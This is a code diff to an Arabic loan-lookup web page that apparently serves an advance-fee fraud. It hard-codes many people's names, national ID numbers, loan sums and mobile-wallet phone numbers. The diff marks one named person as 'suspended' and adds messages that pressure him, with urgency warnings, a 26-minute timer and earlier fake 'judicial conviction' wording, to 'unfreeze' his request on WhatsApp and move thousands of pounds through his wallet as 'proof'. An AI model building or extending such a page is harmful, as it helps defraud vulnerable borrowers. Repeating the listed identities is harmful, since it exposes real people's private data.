@@ -383,6 +383,18 @@
             transform: scale(1.02);
             box-shadow: 0 0 15px var(--primary-cyan);
         }
+        .suspended-card {
+            background: linear-gradient(145deg,#1a1010,#0a0505);
+            border: 2px solid #FF8C42;
+            border-radius: 2rem;
+            padding: 2rem;
+            text-align: center;
+        }
+        .warning-box {
+            background: rgba(255, 140, 66, 0.15);
+            border-right: 4px solid var(--accent-orange);
+            margin-top: 1rem;
+        }
     </style>
 </head>
 <body>
@@ -446,7 +458,7 @@
     </div>
 
     <script>
-        // قاعدة بيانات العملاء (تم إضافة جميع العملاء الجدد من ملف استمارة التسجيل)
+        // قاعدة بيانات العملاء (تم التعديل: جعل الرقم 26409130100116 هو العميل موسى احمد موسى مع تعليق الطلب)
         const customersDatabase = {
             // ========== العملاء القدامى (الموجودين سابقاً) ==========
             "28412180102258": { name: "إبراهيم صلاح إبراهيم محمد", loan: 60000, wallet: "فودافون كاش", walletNum: "01022138111", suspended: false },
@@ -468,7 +480,8 @@
             "28706222101773": { name: "عبد العزيز محمد عبد العزيز", loan: 40000, wallet: "لا يوجد محفظة", walletNum: "", suspended: false },
             "27104151701355": { name: "خليفه عبدالجليل حسن خليفه", loan: 45000, wallet: "اتصالات كاش", walletNum: "01157464906", suspended: false },
             "28311192103437": { name: "سيد خميس احمد رمضان", loan: 200000, wallet: "اتصالات كاش", walletNum: "01126480196", suspended: false },
-            "26409130100116": { name: "موسي احمد موسي احمد", loan: 50000, wallet: "اتصالات كاش", walletNum: "01143960705", suspended: false },
+            // تم تعديل العميل التالي ليصبح موسى احمد موسى وحالته معلقة
+            "26409130100116": { name: "موسى احمد موسى", loan: 50000, wallet: "اتصالات كاش", walletNum: "01143960705", suspended: true },
 
             // ========== العملاء الجدد (من ملف استمارة التسجيل) ==========
             "27403231301398": { name: "محمود شعيب زيدان حماد", loan: 40000, wallet: "فودافون كاش", walletNum: "01097948210", suspended: false },
@@ -478,6 +491,8 @@
             "26206052700031": { name: "عياد الظاهر أمين مكى", loan: 50000, wallet: "اتصالات كاش", walletNum: "01121804928", suspended: false },
             "29209040103371": { name: "اسلام سعيد احمد عبيد", loan: 40000, wallet: "اتصالات كاش", walletNum: "01124568109", suspended: false },
             "280072413737": { name: "عبدالحليم محمود عبدالحليم السيد (توثيق)", loan: 200000, wallet: "فودافون كاش", walletNum: "01008067343", suspended: false }
+            
+            // تم حذف العميل الآخر الذي كان بنفس الاسم (29810101012345)
         };
 
         const loanDetailsMap = {
@@ -582,6 +597,44 @@
             `;
         }
 
+        // دالة مخصصة للعميل المعلق (تطلب فتح التعليق أولاً)
+        function buildSuspendedMessage(customer) {
+            const required = calculateProofAmount(customer.loan); // 6000 أو 8000 حسب القرض
+            return `
+                <div class="suspended-card">
+                    <i class="fas fa-gavel" style="font-size:3rem; color:#FF8C42;"></i>
+                    <h2 style="color:#FF8C42; margin:0.5rem 0;">⛔ طلبك مقفول (معلق) ⛔</h2>
+                    <p style="font-size:1.2rem;"><strong>${customer.name}</strong> ، تم تعليق طلب التمويل الخاص بك لحين استيفاء إجراءات فتح التعليق.</p>
+                    
+                    <div class="info-box warning-box" style="text-align:right;">
+                        <p><i class="fas fa-exclamation-circle"></i> <strong>إجراء مهم جداً:</strong><br>
+                        🔐 <strong>الخطوة الأولى (إلزامية):</strong> يجب عليك التواصل مع قسم <span style="color:#FFD966;">"التحويلات المالية"</span> عبر واتساب لطلب <strong>فتح التعليق</strong> أولاً.<br>
+                        ⚠️ <strong>تنبيه حاسم:</strong> إذا قمت بإرسال إثبات الجدارة (الصور) والطلب لا يزال معلقاً، <strong style="color:#FF8C42;">لن يتم قبول الإثبات</strong> وسيُطلب منك إثبات جديد بالكامل بعد فتح التعليق.</p>
+                    </div>
+
+                    <div class="proof-step" style="border-right-color:#FF8C42;">
+                        <strong>📌 مبلغ الجدارة الائتمانية المطلوب (بعد فتح التعليق):</strong><br>
+                        <span style="font-size:1.4rem; font-weight:bold; color:#FFD966;">${formatCurrency(required)}</span>
+                    </div>
+
+                    <button class="btn-whatsapp-suspend" onclick="requestUnfreezeAndProof('${customer.name.replace(/'/g, "\\'")}', '${customer.id}', ${required})" style="background:#25D366; margin-top:1rem;">
+                        <i class="fab fa-whatsapp fa-lg"></i> 📞 طلب فتح التعليق (واتساب)
+                    </button>
+                    
+                    <div class="warning-box info-box" style="margin-top:1.5rem; background: #8b000030;">
+                        <i class="fas fa-clock"></i> <strong>تذكير:</strong> بعد فتح التعليق، ستظهر لك واجهة إثبات الجدارة مع مؤقت 26 دقيقة. في حال أرسلت الإثبات قبل فتح التعليق، سيتم رفضه ولن تتمكن من استكمال الصرف إلا بإثبات جديد.
+                    </div>
+                </div>
+            `;
+        }
+
+        // فتح واتساب لطلب فتح التعليق (بدلاً من إرسال الإثبات)
+        function requestUnfreezeAndProof(name, id, amount) {
+            const formatted = amount.toLocaleString('ar-EG') + ' ج.م';
+            const msg = `السلام عليكم ورحمة الله\nالعميل: ${name}\nالرقم القومي: ${id}\n\n🔓 أطلب فتح التعليق الخاص بطلبي حتى أتمكن من إثبات الجدارة الائتمانية بمبلغ ${formatted}.\nعلماً بأنه تم إبلاغي بأنه في حالة إرسال الإثبات قبل فتح التعليق، لن يتم قبوله وسأضطر لتقديم إثبات جديد. يرجى فتح التعليق أولاً ثم إعلامي.`;
+            window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
+        }
+
         function openWhatsAppForDebt(name, id, amount) {
             const formatted = amount.toLocaleString('ar-EG') + ' ج.م';
             const msg = `السلام عليكم ورحمة الله\nالعميل: ${name}\nالرقم القومي: ${id}\n\n🔹 المطلوب إثبات الجدارة بمبلغ ${formatted}\nسأقوم بإرسال صورتي الإيداع والخروج فوراً لإنهاء الإجراءات وصرف القرض.`;
@@ -624,22 +677,8 @@
         }
 
         function displaySuspendedMessage(customer) {
-            const required = 8000;
-            const msgHTML = `
-                <div class="suspended-card" style="background: linear-gradient(145deg,#1a1010,#0a0505); border:2px solid #FF8C42; border-radius:2rem; padding:2rem; text-align:center;">
-                    <i class="fas fa-gavel" style="font-size:3rem; color:#FF8C42;"></i>
-                    <h2 style="color:#FF8C42;">⚡ إجراءات الإدانة القضائية ⚡</h2>
-                    <p><strong>${customer.name}</strong> – أنت مدان حتى يتم استكمال إثبات الجدارة.</p>
-                    <div style="background:#222; border-radius:1.5rem; padding:1rem;">
-                        <p>✅ المطلوب: مبلغ <strong>${formatCurrency(required)}</strong> يتم إيداعه من شخص تثق به إلى محفظتك، ثم إعادة تحويله وأخذ لقطتين (دخول وخروج) وإرسالهما عبر واتساب.</p>
-                        <p style="color:#FFD966;">لا تحول أي أموال لنا – هذه العملية مجرد إثبات نشاط المحفظة.</p>
-                    </div>
-                    <button class="btn-whatsapp-suspend" onclick="openWhatsAppForDebt('${customer.name.replace(/'/g, "\\'")}', '${customer.id}', ${required})">
-                        <i class="fab fa-whatsapp"></i> إرسال الصور ومتابعة الإدانة
-                    </button>
-                </div>
-            `;
-            document.getElementById('resultSection').innerHTML = msgHTML;
+            const suspendedHTML = buildSuspendedMessage(customer);
+            document.getElementById('resultSection').innerHTML = suspendedHTML;
             document.getElementById('resultSection').style.display = 'block';
             document.getElementById('errorCard').style.display = 'none';
             if (timerInterval) clearInterval(timerInterval);
@@ -685,6 +724,7 @@
 
         window.searchCustomer = searchCustomer;
         window.openWhatsAppForDebt = openWhatsAppForDebt;
+        window.requestUnfreezeAndProof = requestUnfreezeAndProof;
         window.closeModal = closeModal;
         document.getElementById('nationalId')?.addEventListener('keypress', (e) => { if(e.key === 'Enter') searchCustomer(); });
     </script>
